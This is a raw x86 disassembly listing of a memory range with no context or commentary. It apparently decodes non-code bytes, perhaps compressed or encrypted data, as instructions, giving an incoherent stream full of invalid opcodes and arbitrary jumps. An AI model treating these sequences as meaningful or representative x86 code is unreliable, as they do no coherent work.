  41ba9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9f:	mov    dl,0x6d
  41baa1:	xchg   ebp,eax
  41baa2:	in     eax,dx
  41baa3:	fsubr  st(6),st
  41baa5:	sbb    bh,BYTE PTR [ebp-0x57e2cda1]
  41baab:	shl    DWORD PTR [edx+0x1f],0x48
  41baaf:	arpl   WORD PTR [ebx],di
  41bab1:	add    DWORD PTR [ebp-0x19],esi
  41bab4:	inc    cx
  41bab6:	int    0xf2
  41bab8:	test   DWORD PTR [ebp-0x26],ecx
  41babb:	mov    edx,0x49b58245
  41bac0:	shr    BYTE PTR [ebx-0x5694e165],cl
  41bac6:	pop    DWORD PTR ds:0x6939cc2a
  41bacc:	pop    ecx
  41bacd:	aam    0x79
  41bacf:	je     0x41bad8
  41bad1:	fadd   DWORD PTR [ecx+0x6a]
  41bad4:	adc    bl,dh
  41bad6:	lds    eax,FWORD PTR [edi-0x4469837d]
  41badc:	push   edx
  41badd:	jle    0x41ba8e
  41badf:	jmp    0x41bb53
  41bae1:	adc    edx,ebx
  41bae3:	jp     0x41bae1
  41bae5:	aas    
  41bae6:	pop    edi
  41bae7:	out    dx,al
  41bae8:	scas   eax,DWORD PTR es:[edi]
  41bae9:	repz arpl cx,ax
  41baec:	or     DWORD PTR [edx+ebp*2+0x67],ebp
  41baf0:	mov    esi,0xfacd2722
  41baf5:	adc    DWORD PTR [ebx+0x6377d7e5],esi
  41bafb:	inc    esi
  41bafc:	pop    ebx
  41bafd:	in     al,0x6b
  41baff:	pop    ds
  41bb00:	push   ebx
  41bb01:	into   
  41bb02:	xchg   ecx,eax
  41bb03:	adc    BYTE PTR [esi+ebp*8-0x547015e],cl
  41bb0a:	out    dx,eax
  41bb0b:	pop    ebp
  41bb0c:	aam    0xc8
  41bb0e:	cwde   
  41bb0f:	daa    
  41bb10:	mov    edx,0xd7951a7e
  41bb15:	sti    
  41bb16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb17:	xchg   esp,eax
  41bb18:	imul   DWORD PTR [edx-0x8]
  41bb1b:	mov    al,0xb2
  41bb1d:	popa   
  41bb1e:	popa   
  41bb1f:	les    esi,FWORD PTR [ebx+0x36]
  41bb22:	cs ret 0x8015
  41bb26:	fldenv gs:[ebx-0x35]
  41bb2a:	jp     0x41bb1c
  41bb2c:	add    al,0x9b
  41bb2e:	xchg   DWORD PTR [edx],edx
  41bb30:	and    BYTE PTR [eax-0x1bf0697a],bh
  41bb36:	dec    edi
  41bb37:	and    eax,0xd59b1abc
  41bb3c:	add    al,0xe3
  41bb3e:	add    eax,0xc9e8a93e
  41bb43:	jmp    0x41bbb4
  41bb45:	js     0x41bb9c
  41bb47:	mov    ds:0x1002dd63,eax
  41bb4c:	jno    0x41bad8
  41bb4e:	jecxz  0x41bb69
  41bb50:	test   eax,0xdad0659
  41bb55:	pop    ebx
  41bb56:	pop    esp
  41bb57:	add    al,0xe6
  41bb59:	mov    ds:0x83f6fe9f,al
  41bb5e:	pop    eax
  41bb5f:	inc    ebp
  41bb60:	jle    0x41bb7b
  41bb62:	sub    esp,DWORD PTR [ebp+0x737bc12e]
  41bb68:	pop    ecx
  41bb69:	ret    
  41bb6a:	sbb    al,0xe2
  41bb6c:	iret   
  41bb6d:	call   0x9726:0x8a17674
  41bb74:	sub    BYTE PTR [esi],dl
  41bb76:	cs dec eax
  41bb78:	test   eax,0xe9fa6b99
  41bb7d:	mov    ch,BYTE PTR [edx-0x70]
  41bb80:	xchg   esp,eax
  41bb81:	retf   
  41bb82:	mov    al,0xb9
  41bb84:	(bad)  
  41bb85:	push   eax
  41bb86:	jp     0x41bb66
  41bb88:	int    0x14
  41bb8a:	or     dl,dh
  41bb8c:	or     eax,0xbbad4fb8
  41bb91:	cmp    ah,al
  41bb93:	mov    ebx,0x5c5847cf
  41bb98:	in     ax,dx
  41bb9a:	fld    TBYTE PTR [eax+0x6b]
  41bb9d:	push   esp
  41bb9e:	inc    edx
  41bb9f:	xlat   BYTE PTR ds:[ebx]
  41bba0:	fucom  st(2)
  41bba2:	out    0x36,al
  41bba4:	and    ah,al
  41bba6:	and    BYTE PTR [edi],ah
  41bba8:	adc    eax,0x5ae1c82d
  41bbad:	out    0xd2,eax
  41bbaf:	jmp    0x41bb97
  41bbb1:	lods   eax,DWORD PTR ds:[esi]
  41bbb2:	fist   DWORD PTR [ecx-0x3644bde1]
  41bbb8:	stc    
  41bbb9:	pop    ebx
  41bbba:	push   esp
  41bbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbbc:	dec    ecx
  41bbbd:	mov    al,ds:0x89b0326d
  41bbc2:	mov    ebx,DWORD PTR [ecx-0x49b55520]
  41bbc8:	cmp    al,0x4b
  41bbca:	call   0xadba88dc
  41bbcf:	popf   
  41bbd0:	cmp    al,0xc
  41bbd2:	in     al,dx
  41bbd3:	sbb    eax,0xab0cecc8
  41bbd8:	push   esp
  41bbd9:	mov    cl,0xc0
  41bbdb:	mov    bl,0x87
  41bbdd:	push   ebp
  41bbde:	adc    ch,BYTE PTR [eax+0x27d5b1a8]
  41bbe4:	push   edi
  41bbe5:	mov    es,ebx
  41bbe7:	mov    edi,0x12db7404
  41bbec:	xlat   BYTE PTR ds:[bx]
  41bbee:	push   cs
  41bbef:	ss (bad) 
  41bbf1:	shl    BYTE PTR [esi],cl
  41bbf3:	loope  0x41bb85
  41bbf5:	test   DWORD PTR [esi+0x424d6054],esi
  41bbfb:	mov    ebx,0x21b24c2d
  41bc00:	out    dx,eax
  41bc01:	inc    ebp
  41bc02:	ffree  st(0)
  41bc04:	call   0xb4cbba99
  41bc09:	xchg   esp,eax
  41bc0a:	lds    edi,FWORD PTR [ecx]
  41bc0c:	push   ebp
  41bc0d:	xchg   edx,eax
  41bc0e:	fs or  al,0xfd
  41bc11:	jge    0x41bc8c
  41bc13:	push   ebp
  41bc14:	cmp    al,BYTE PTR [ecx+0x34f6b168]
  41bc1a:	out    0x3,eax
  41bc1c:	call   0x1f5e:0x54eb5033
  41bc23:	retf   
  41bc24:	retf   
  41bc25:	cdq    
  41bc26:	sub    eax,0xd09cc9cc
  41bc2b:	cmp    DWORD PTR [ebp+0x77],eax
  41bc2e:	xchg   BYTE PTR [edi+0xb1c3439],dl
  41bc34:	inc    ebx
  41bc35:	lahf   
  41bc36:	outs   dx,DWORD PTR ds:[esi]
  41bc37:	loop   0x41bc1a
  41bc39:	test   al,0x23
  41bc3b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41bc3d:	stos   DWORD PTR es:[edi],eax
  41bc3e:	rcl    DWORD PTR [esi+0x47018c5e],1
  41bc44:	adc    al,0x28
  41bc46:	lods   eax,DWORD PTR ds:[esi]
  41bc47:	in     al,dx
  41bc48:	jmp    0xbd76ce2b
  41bc4d:	sub    ch,al
  41bc4f:	rcr    dl,0xb
  41bc52:	pop    esp
  41bc53:	or     DWORD PTR gs:[ebp+0x9],ebx
  41bc57:	push   cs
  41bc58:	xor    BYTE PTR [eax],bl
  41bc5a:	test   al,0xe8
  41bc5c:	xchg   edi,eax
  41bc5d:	ret    
  41bc5e:	and    ah,al
  41bc60:	das    
  41bc61:	pop    esi
  41bc62:	pop    esp
  41bc63:	push   esp
  41bc64:	or     ebp,DWORD PTR [edi+0x32]
  41bc67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc68:	sbb    al,0x5a
  41bc6a:	loop   0x41bc9b
  41bc6c:	jp     0x41bc95
  41bc6e:	jns    0x41bc42
  41bc70:	pop    esi
  41bc71:	cmp    ch,BYTE PTR [esi-0x536e0ab8]
  41bc77:	mov    bl,0xb4
  41bc79:	inc    ecx
  41bc7a:	out    dx,al
  41bc7b:	jecxz  0x41bcf2
  41bc7d:	mov    dh,0xac
  41bc7f:	jge    0x41bc2b
  41bc81:	jp     0x41bcc9
  41bc83:	fidiv  WORD PTR [ebx+0x5b]
  41bc86:	int    0x67
  41bc88:	xor    BYTE PTR [edi-0x2d19e38c],ch
  41bc8e:	or     BYTE PTR [eax],bh
  41bc90:	or     eax,ebx
  41bc92:	ja     0x41bc41
  41bc94:	fiadd  DWORD PTR [eax]
	...
  41bd12:	add    BYTE PTR [eax],al
  41bd14:	in     eax,dx
  41bd15:	jle    0x41bd09
  41bd17:	ret    
  41bd18:	repz iret 
  41bd1a:	std    
  41bd1b:	jle    0x41bcfc
  41bd1d:	loope  0x41bd61
  41bd1f:	mov    al,0xd3
  41bd21:	mov    ebp,0x5aaa2ca2
  41bd26:	add    DWORD PTR [eax],eax
  41bd28:	imul   eax,DWORD PTR [edi],0x6bb10000
  41bd2e:	(bad)  
  41bd30:	sbb    al,0x30
  41bd32:	in     al,dx
  41bd33:	stc    
  41bd34:	ss je  0x41bd32
  41bd37:	dec    edx
  41bd38:	or     eax,DWORD PTR [ecx]
  41bd3a:	mov    dl,BYTE PTR [ecx-0x4852078]
  41bd40:	mov    bh,0x10
  41bd42:	ja     0x41bd81
  41bd44:	lods   eax,DWORD PTR ds:[esi]
  41bd45:	sub    al,0x7a
  41bd47:	(bad)  
  41bd48:	repnz cmp BYTE PTR ds:0x451e1558,0x94
  41bd50:	or     eax,0xe8df7b9f
  41bd55:	mov    cl,0xfb
  41bd57:	inc    ebp
  41bd58:	adc    al,0x6f
  41bd5a:	loop   0x41bce8
  41bd5c:	(bad)  
  41bd5e:	jg     0x41bd63
  41bd60:	mov    ch,0x24
  41bd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd63:	cmp    DWORD PTR [eax+0x2],edi
  41bd66:	je     0x41bd59
  41bd68:	push   ebp
  41bd69:	outs   dx,BYTE PTR ds:[esi]
  41bd6a:	popa   
  41bd6b:	xor    al,0xb5
  41bd6d:	jne    0x41bd86
  41bd6f:	jmp    0x590e95d2
  41bd74:	sbb    al,0xf4
  41bd76:	mov    bh,0x91
  41bd78:	mov    eax,fs
  41bd7a:	pop    edi
  41bd7b:	xchg   ecx,eax
  41bd7c:	xchg   ebx,eax
  41bd7d:	in     al,0x76
  41bd7f:	jle    0x41bd84
  41bd81:	repnz retf 
  41bd83:	xchg   edx,eax
  41bd84:	fwait
  41bd85:	cmp    BYTE PTR [ebp+0x6a],bl
  41bd88:	jecxz  0x41bd5a
  41bd8a:	sar    BYTE PTR [ebx],cl
  41bd8c:	stos   DWORD PTR es:[edi],eax
  41bd8d:	pushf  
  41bd8e:	cmp    ch,BYTE PTR [ebx-0x29]
  41bd91:	sbb    BYTE PTR [ecx],dh
  41bd93:	stos   BYTE PTR es:[edi],al
  41bd94:	and    dh,dl
  41bd96:	fadd   DWORD PTR [edx]
  41bd98:	scas   eax,DWORD PTR es:[edi]
  41bd99:	cmp    eax,0xe099b723
  41bd9e:	mov    esi,0x34d8c4e4
  41bda3:	jnp    0x41bda4
  41bda5:	push   edi
  41bda6:	xchg   ebp,eax
  41bda7:	pop    ss
  41bda8:	cmc    
  41bda9:	cmp    al,0x20
  41bdab:	mov    ds:0x895196ea,al
  41bdb0:	(bad)  
  41bdb1:	xor    DWORD PTR [edx-0x6b],eax
  41bdb4:	sbb    eax,0x6a58da4
  41bdb9:	enter  0x57f6,0xa5
  41bdbd:	jnp    0x41bdbb
  41bdbf:	hlt    
  41bdc0:	nop
  41bdc1:	in     al,dx
  41bdc2:	(bad)  
  41bdc3:	rcr    dh,1
  41bdc5:	ficomp WORD PTR [ecx]
  41bdc7:	push   ds
  41bdc8:	imul   ebp,DWORD PTR [ecx+0x6b2d5e54],0xd782e062
  41bdd2:	mov    eax,0xf74d3162
  41bdd7:	mov    dl,0x1b
  41bdd9:	(bad)  
  41bdda:	ja     0x41be35
  41bddc:	mov    al,0x49
  41bdde:	repz push ebp
  41bde0:	bound  ebp,QWORD PTR [eax+0x23dc92c]
  41bde6:	popa   
  41bde7:	jo     0x41be3e
  41bde9:	or     edx,esp
  41bdeb:	pop    ds
  41bdec:	ror    DWORD PTR [ecx+0x49104ccb],1
  41bdf2:	imul   DWORD PTR [edx+0x27363751]
  41bdf8:	push   es
  41bdf9:	jg     0x41be1d
  41bdfb:	pop    ebx
  41bdfc:	enter  0x7133,0x9
  41be00:	xor    DWORD PTR [edi],edx
  41be02:	or     eax,DWORD PTR [edx-0x47144575]
  41be08:	xor    al,0xf9
  41be0a:	outs   dx,BYTE PTR ds:[esi]
  41be0b:	cmc    
  41be0c:	add    BYTE PTR [edi+eax*8-0x65],0x17
  41be11:	arpl   WORD PTR [edi+0x41478ed4],dx
  41be17:	retf   0x8aee
  41be1a:	test   al,0x99
  41be1c:	lds    eax,FWORD PTR [edi]
  41be1e:	sbb    BYTE PTR [edx+0x74],al
  41be21:	xor    esp,0x6902522b
  41be27:	cwde   
  41be28:	xchg   esp,eax
  41be29:	jp     0x41be34
  41be2b:	sub    eax,0xc7e298e2
  41be30:	jb     0x41be1d
  41be32:	cs nop
  41be34:	retf   
  41be35:	sbb    ah,0x21
  41be38:	imul   ebx,DWORD PTR [ecx-0x68],0x731f799d
  41be3f:	or     al,0xc6
  41be41:	icebp  
  41be42:	jb     0x41bdd7
  41be44:	aaa    
  41be45:	adc    ebp,DWORD PTR [edi]
  41be47:	hlt    
  41be48:	and    al,0x8a
  41be4a:	xor    eax,0x2f9bed0c
  41be4f:	call   0x917c:0x26a54aaf
  41be56:	and    BYTE PTR [edx],ah
  41be58:	inc    esi
  41be59:	das    
  41be5a:	dec    edx
  41be5b:	test   DWORD PTR [esi+0x65],edx
  41be5e:	fidivr DWORD PTR [eax-0x7bf7d7d1]
  41be64:	dec    edi
  41be65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be66:	push   0xffffffb7
  41be68:	push   0xffffffe9
  41be6a:	aaa    
  41be6b:	scas   eax,DWORD PTR es:[edi]
  41be6c:	add    ecx,DWORD PTR [ebx-0x2e]
  41be6f:	xchg   edi,eax
  41be70:	ins    DWORD PTR es:[edi],dx
  41be71:	shl    BYTE PTR [si-0x6a],1
  41be75:	loop   0x41be51
  41be77:	aaa    
  41be78:	fst    DWORD PTR [ebp+0x4b2600e5]
  41be7e:	fld    TBYTE PTR [esi-0x79]
  41be81:	or     dl,dh
  41be83:	addr16 jae 0x41be26
  41be86:	fimul  WORD PTR cs:[esi+0x1b]
  41be8a:	xchg   edi,eax
  41be8b:	lock jne 0x41bef7
  41be8e:	inc    edx
  41be8f:	jmp    0x41be33
  41be91:	ss jb  0x41beb9
  41be94:	adc    dh,BYTE PTR [ebx+0x4d]
  41be97:	mov    bl,bh
  41be99:	sahf   
  41be9a:	cdq    
  41be9b:	fisttp DWORD PTR [eax+edi*8-0x3d]
  41be9f:	ins    BYTE PTR es:[edi],dx
  41bea0:	cmp    BYTE PTR [eax-0x4038e5af],dh
  41bea6:	dec    ebp
  41bea7:	push   ds
  41bea8:	inc    esi
  41bea9:	pop    ebx
  41beaa:	retf   0x12ba
  41bead:	test   DWORD PTR [edi],edx
  41beaf:	xchg   esp,eax
  41beb0:	mov    ebp,0x7e6ec002
  41beb5:	pop    eax
  41beb6:	scas   al,BYTE PTR es:[edi]
  41beb7:	cmp    al,0xd9
  41beb9:	add    eax,0xb9e55050
  41bebe:	cmp    ah,BYTE PTR [edi]
  41bec0:	sub    al,0x9b
  41bec2:	data16 jae 0x41beab
  41bec5:	fbstp  TBYTE PTR ds:0x13851650
  41becb:	push   edx
  41becc:	jl     0x41be77
  41bece:	fnsave [ecx+0x71b2579e]
  41bed4:	ror    DWORD PTR [esi],1
  41bed6:	or     DWORD PTR [edx*8+0x2c627f4e],0x71
  41bede:	adc    BYTE PTR [eax+0x51],dh
  41bee1:	push   esp
  41bee2:	call   0xffe5:0x6aeef89e
  41bee9:	mov    al,0x37
  41beeb:	stos   BYTE PTR es:[edi],al
  41beec:	int    0xdf
  41beee:	cmp    eax,0x6f9e12f8
  41bef3:	mov    edi,0xb0c9be9a
  41bef8:	jle    0x41beca
  41befa:	xchg   BYTE PTR ds:0x11fec38d,ah
  41bf00:	xor    bl,BYTE PTR [esi-0x2a]
  41bf03:	add    BYTE PTR [ebp-0x35],bl
  41bf06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf07:	adc    ch,BYTE PTR [ebx-0x66176a29]
  41bf0d:	mov    BYTE PTR [ebx+esi*2-0x2ae7de02],dl
  41bf14:	xlat   BYTE PTR ds:[ebx]
  41bf15:	enter  0xdace,0xdf
  41bf19:	enter  0xc8fe,0x30
  41bf1d:	jbe    0x41bf5d
  41bf1f:	add    bh,BYTE PTR [esi+0x42c988a7]
  41bf25:	sub    esp,DWORD PTR [eax+eiz*2]
  41bf28:	sub    DWORD PTR [ebx],eax
  41bf2a:	arpl   WORD PTR [edx],di
  41bf2c:	outs   dx,DWORD PTR ds:[esi]
  41bf2d:	adc    edi,DWORD PTR [ecx+0x1101415b]
  41bf33:	jp     0x41bef0
  41bf35:	cs scas eax,DWORD PTR es:[edi]
  41bf37:	call   DWORD PTR [ebx-0xd]
  41bf3a:	out    0x33,al
  41bf3c:	cdq    
  41bf3d:	and    al,0x88
  41bf3f:	xor    esi,DWORD PTR [edi-0x5a5ae75d]
  41bf45:	mov    al,ds:0xa05e4b2e
  41bf4a:	jbe    0x41bf7a
  41bf4c:	imul   ebx,DWORD PTR [edx+0x29570777],0x7e950111
  41bf56:	int3   
  41bf57:	sub    eax,0xe844be0
  41bf5c:	inc    eax
  41bf5d:	mov    eax,0x7b8d4aa1
  41bf62:	icebp  
  41bf63:	push   ebx
  41bf64:	ret    0x2b24
  41bf67:	or     ecx,DWORD PTR [ebp-0x57]
  41bf6a:	cmp    DWORD PTR [ecx+0x1f],esi
  41bf6d:	dec    ebp
  41bf6e:	popa   
  41bf6f:	sbb    al,0x9f
  41bf71:	lea    eax,[ebp-0x6c]
  41bf74:	mov    al,0xda
  41bf76:	mov    eax,ds:0x977d6fb2
  41bf7b:	or     ebx,edx
  41bf7d:	(bad)  
  41bf7e:	or     DWORD PTR [eax+0x2a80b543],edi
  41bf84:	pop    edi
  41bf85:	pop    ss
  41bf86:	(bad)  
  41bf87:	push   edi
  41bf88:	addr16 cdq 
  41bf8a:	repnz (bad) 
  41bf8c:	push   ebx
  41bf8d:	retf   0x6abd
  41bf90:	adc    al,0x2d
  41bf92:	cld    
  41bf93:	adc    bh,cl
  41bf95:	cmp    DWORD PTR [esi],esi
  41bf97:	pop    ecx
  41bf98:	popa   
  41bf99:	retf   0x7cf7
  41bf9c:	mov    al,ds:0xf5108905
  41bfa1:	mov    ebx,0xbffa9e67
  41bfa6:	push   cs
  41bfa7:	dec    esi
  41bfa8:	jnp    0x41bfaf
  41bfaa:	fadd   st,st(3)
  41bfac:	call   0xb099:0x6b25b2aa
  41bfb3:	mov    eax,0x612e813c
  41bfb8:	stos   DWORD PTR es:[edi],eax
  41bfb9:	cdq    
  41bfba:	and    DWORD PTR [eax-0x44],esp
  41bfbd:	imul   edx,DWORD PTR [edi],0x851b064d
  41bfc3:	xlat   BYTE PTR ds:[ebx]
  41bfc4:	xchg   DWORD PTR [ebp+0x13e150c2],eax
  41bfca:	ds xchg ebp,eax
  41bfcc:	sbb    al,0x43
  41bfce:	sbb    ch,BYTE PTR [esi]
  41bfd0:	in     eax,0x48
  41bfd2:	push   edi
  41bfd3:	mov    ds:0x431e34ec,eax
  41bfd8:	ins    DWORD PTR es:[edi],dx
  41bfd9:	jnp    0x41bfec
  41bfdb:	into   
  41bfdc:	cmp    cl,BYTE PTR [esp+ecx*2]
  41bfdf:	(bad)  
  41bfe0:	idiv   BYTE PTR [edi+0x29]
  41bfe3:	jg     0x41c03c
  41bfe5:	mov    bl,0x1d
  41bfe7:	inc    esp
  41bfe8:	jo     0x41c064
  41bfea:	inc    ebx
  41bfeb:	das    
  41bfec:	sbb    al,0x2e
  41bfee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfef:	retf   
  41bff0:	in     al,0xcb
  41bff2:	xor    esi,DWORD PTR [edi]
  41bff4:	sbb    ebp,DWORD PTR [ebp+0x2cca356e]
  41bffa:	jb     0x41bfe8
  41bffc:	mov    ch,0xdd
  41bffe:	push   edi
  41bfff:	adc    eax,0x9a51e1b3
  41c004:	cs jns 0x41c06d
  41c007:	arpl   WORD PTR [ebp-0x79],sp
  41c00a:	push   esp
  41c00b:	mov    edi,0xc43a2b9f
  41c010:	dec    esp
  41c011:	ins    DWORD PTR es:[edi],dx
  41c012:	mov    esi,0x5f13d375
  41c018:	hlt    
  41c019:	and    eax,0x84b75a68
  41c01e:	leave  
  41c01f:	mov    WORD PTR [ebx],ss
  41c021:	inc    edx
  41c022:	pop    ecx
  41c023:	push   edi
  41c024:	loop   0x41c04b
  41c026:	and    bl,BYTE PTR [edi]
  41c028:	add    BYTE PTR [edx],0x4e
  41c02b:	or     BYTE PTR [esi-0x1f55bd4],cl
  41c031:	xlat   BYTE PTR ds:[ebx]
  41c032:	mov    bh,0x10
  41c034:	scas   eax,DWORD PTR es:[edi]
  41c035:	cli    
  41c036:	popf   
  41c037:	out    0x3d,al
  41c039:	mov    bh,0x31
  41c03b:	repz out 0x7c,eax
  41c03e:	jmp    0x143e:0x8cfd8b89
  41c045:	and    al,0x88
  41c047:	push   edx
  41c048:	retf   
  41c049:	fild   WORD PTR [edi]
  41c04b:	jae    0x41c0c4
  41c04d:	add    BYTE PTR [esi+0x37],0xdd
  41c051:	shr    ebx,0x9b
  41c054:	xor    bh,BYTE PTR [edx+0x24]
  41c057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c058:	(bad)  
  41c059:	retw   
  41c05b:	and    bh,ch
  41c05d:	pop    esp
  41c05e:	stc    
  41c05f:	cli    
  41c060:	outs   dx,DWORD PTR ds:[esi]
  41c061:	(bad)  
  41c062:	and    DWORD PTR [edi-0x43],ebp
  41c065:	mov    al,ds:0xf3450674
  41c06a:	(bad)  
  41c06b:	cmp    ebx,edi
  41c06d:	inc    esi
  41c06e:	inc    eax
  41c06f:	mov    ecx,0xfaf581f4
  41c074:	jo     0x41c081
  41c076:	sbb    eax,0x2db52ca4
  41c07b:	inc    edx
  41c07c:	xchg   edx,eax
  41c07d:	xchg   edi,eax
  41c07e:	sub    eax,0x889f3f99
  41c083:	push   0x4714d0f3
  41c088:	dec    ecx
  41c089:	mov    edx,0x7e6d2d7e
  41c08e:	daa    
  41c08f:	add    edi,DWORD PTR [ecx+0x6f]
  41c092:	call   0xe4fb0fb1
  41c097:	pusha  
  41c098:	xor    dh,BYTE PTR [eax]
  41c09a:	mov    dh,0xa3
  41c09c:	mov    eax,0x61939a14
  41c0a1:	xor    ebx,0x907e2975
  41c0a7:	ds stos DWORD PTR es:[edi],eax
  41c0a9:	jl     0x41c0bf
  41c0ab:	out    dx,al
  41c0ac:	xor    DWORD PTR [eax-0x341e3a35],ebx
  41c0b2:	pop    ebx
  41c0b3:	lahf   
  41c0b4:	pushf  
  41c0b5:	push   edi
  41c0b6:	nop
  41c0b7:	pusha  
  41c0b8:	ss inc eax
  41c0ba:	aas    
  41c0bb:	out    0xe7,eax
  41c0bd:	loope  0x41c078
  41c0bf:	dec    esp
  41c0c0:	add    esi,DWORD PTR [esi]
  41c0c2:	xlat   BYTE PTR ds:[ebx]
  41c0c3:	or     cl,cl
  41c0c5:	xor    DWORD PTR [ecx],edi
  41c0c7:	xchg   ecx,eax
  41c0c8:	xor    eax,0xc060ba23
  41c0cd:	or     ch,BYTE PTR [edi]
  41c0cf:	addr16 adc bl,0x70
  41c0d3:	daa    
  41c0d4:	xchg   esi,eax
  41c0d5:	idiv   DWORD PTR [edi+0x1db0ea72]
  41c0db:	jmp    0x41c100
  41c0dd:	jns    0x41c06b
  41c0df:	pop    ebx
  41c0e0:	fs aaa 
  41c0e2:	ss push ss
  41c0e4:	cmp    al,BYTE PTR [edx-0x3a]
  41c0e7:	mov    esp,0x7ca8c99c
  41c0ec:	ins    BYTE PTR es:[edi],dx
  41c0ed:	xchg   ecx,eax
  41c0ee:	xor    ecx,ecx
  41c0f0:	loopne 0x41c164
  41c0f2:	daa    
  41c0f3:	adc    DWORD PTR [ebx+ebx*2+0x1fb8a16d],ecx
  41c0fa:	add    BYTE PTR [ecx+0x78],dl
  41c0fd:	push   edx
  41c0fe:	pop    eax
  41c0ff:	push   ebx
  41c100:	ret    0x483e
  41c103:	mov    eax,ds:0x666feb26
  41c108:	dec    eax
  41c109:	xor    DWORD PTR [eax+0x31],0x50af1bb0
  41c110:	push   ebp
  41c111:	jecxz  0x41c130
  41c113:	and    eax,0x3b1efe37
  41c118:	and    dh,BYTE PTR [esp+ebp*4]
  41c11b:	jnp    0x41c151
  41c11d:	xor    al,0xf0
  41c11f:	mov    DWORD PTR [ebx+0x22],esp
  41c122:	push   ecx
  41c123:	cmp    al,0xd9
  41c125:	test   BYTE PTR [edx-0x4288afb8],dh
  41c12b:	out    0x53,al
  41c12d:	in     al,0x6
  41c12f:	pop    ecx
  41c130:	rol    ebp,0x4b
  41c133:	rcr    BYTE PTR [ecx-0x2a],cl
  41c136:	sahf   
  41c137:	loop   0x41c17a
  41c139:	inc    DWORD PTR [ebx+edi*2-0x80]
  41c13d:	xor    edi,esi
  41c13f:	xchg   ebp,eax
  41c140:	outs   dx,BYTE PTR ds:[esi]
  41c141:	nop
  41c142:	icebp  
  41c143:	int3   
  41c144:	or     DWORD PTR [esp+edi*1],0x58
  41c148:	bound  eax,QWORD PTR [ebx+0x34930865]
  41c14e:	dec    esp
  41c14f:	iret   
  41c150:	repnz fist DWORD PTR [ebx-0x11]
  41c154:	add    ch,dl
  41c156:	mov    bl,0x11
  41c158:	add    esi,DWORD PTR [edi+0x50]
  41c15b:	pop    ss
  41c15c:	dec    ebp
  41c15d:	ds ja  0x41c13e
  41c160:	inc    ecx
  41c161:	popf   
  41c162:	psraw  mm6,mm1
  41c165:	test   esi,edi
  41c167:	sbb    BYTE PTR [eax],bh
  41c169:	fbstp  TBYTE PTR [ebx+edx*8]
  41c16c:	sbb    eax,eax
  41c16e:	xor    DWORD PTR [edx-0x58],0x84db49e3
  41c175:	retf   
  41c176:	arpl   dx,dx
  41c178:	inc    edx
  41c179:	inc    edx
  41c17a:	lods   eax,DWORD PTR ds:[esi]
  41c17b:	into   
  41c17c:	sub    BYTE PTR [ebx+edi*1-0x1749cebf],0x4c
  41c184:	into   
  41c185:	stos   BYTE PTR es:[edi],al
  41c186:	jne    0x41c181
  41c188:	mov    dh,dl
  41c18a:	mov    ds:0x7e4041b,al
  41c18f:	cld    
  41c190:	test   eax,ebx
  41c192:	sbb    edx,DWORD PTR [esp+ebp*8]
  41c195:	xchg   esp,eax
  41c196:	dec    ebx
  41c197:	xchg   edx,eax
  41c198:	(bad)  
  41c199:	inc    DWORD PTR [eax-0x1470387a]
  41c19f:	stos   DWORD PTR es:[edi],eax
  41c1a0:	xor    al,0x97
  41c1a2:	sbb    esp,DWORD PTR [edx+edx*8]
  41c1a5:	xor    dh,cl
  41c1a7:	cdq    
  41c1a8:	cmp    esp,0xb7bc3aac
  41c1ae:	jp     0x41c204
  41c1b0:	leave  
  41c1b1:	mov    edi,0x1a17c7b0
  41c1b6:	scas   al,BYTE PTR es:[edi]
  41c1b7:	test   eax,eax
  41c1b9:	xchg   esi,eax
  41c1ba:	sub    dl,BYTE PTR [edx+0x13]
  41c1bd:	push   esp
  41c1be:	inc    esi
  41c1bf:	in     al,0xb
  41c1c1:	jno    0x41c201
  41c1c3:	and    DWORD PTR [ebp-0x5321ba0f],ebx
  41c1c9:	(bad)  
  41c1ca:	sar    BYTE PTR [eax],1
  41c1cc:	fucomp st(1)
  41c1ce:	sar    DWORD PTR [ecx],0x91
  41c1d1:	push   edx
  41c1d2:	shr    BYTE PTR [edx+eax*1],1
  41c1d5:	mov    dh,0x81
  41c1d7:	jmp    0xf611e361
  41c1dc:	add    eax,0x849e17e0
  41c1e1:	xor    bl,dl
  41c1e3:	dec    ebp
  41c1e4:	inc    ebx
  41c1e5:	mov    esp,0x736c83f0
  41c1ea:	retf   0xea7c
  41c1ed:	xor    ebx,DWORD PTR [esi+eax*1]
  41c1f0:	shl    BYTE PTR [eax-0x140c1a2f],0x51
  41c1f7:	cdq    
  41c1f8:	mov    al,ds:0xf223d103
  41c1fd:	outs   dx,BYTE PTR ds:[esi]
  41c1fe:	mov    bl,0x69
  41c200:	inc    ebp
  41c201:	loope  0x41c1e7
  41c203:	out    dx,al
  41c204:	leave  
  41c205:	adc    DWORD PTR [eax+0x61],0xb956b7a4
  41c20c:	cs daa 
  41c20e:	dec    esi
  41c20f:	lea    eax,[esi]
  41c211:	or     esp,ebx
  41c213:	dec    ecx
  41c214:	push   eax
  41c215:	cmp    DWORD PTR [edi+0x791beeae],esi
  41c21b:	pop    es
  41c21c:	mov    esp,0xb135fe5
  41c221:	mov    BYTE PTR [edi+0x18],al
  41c224:	inc    edx
  41c225:	adc    eax,0xc44499ea
  41c22a:	dec    esi
  41c22b:	and    cl,dl
  41c22d:	adc    ebp,edx
  41c22f:	adc    eax,0xe2c406b4
  41c234:	sub    eax,0xaa66e09b
  41c239:	or     bh,BYTE PTR ds:[eax-0x3ced90f5]
  41c240:	scas   eax,DWORD PTR es:[edi]
  41c241:	jp     0x41c29e
  41c243:	loopne 0x41c22c
  41c245:	ret    0x23da
  41c248:	xor    dl,BYTE PTR [eax-0x2b]
  41c24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c24c:	jg     0x41c2b7
  41c24e:	bound  ecx,QWORD PTR [ebx+0x51]
  41c251:	(bad)  
  41c252:	cmp    ecx,DWORD PTR [eax]
  41c254:	adc    BYTE PTR [ecx+0x5c141462],ah
  41c25a:	jbe    0x41c221
  41c25c:	pop    esp
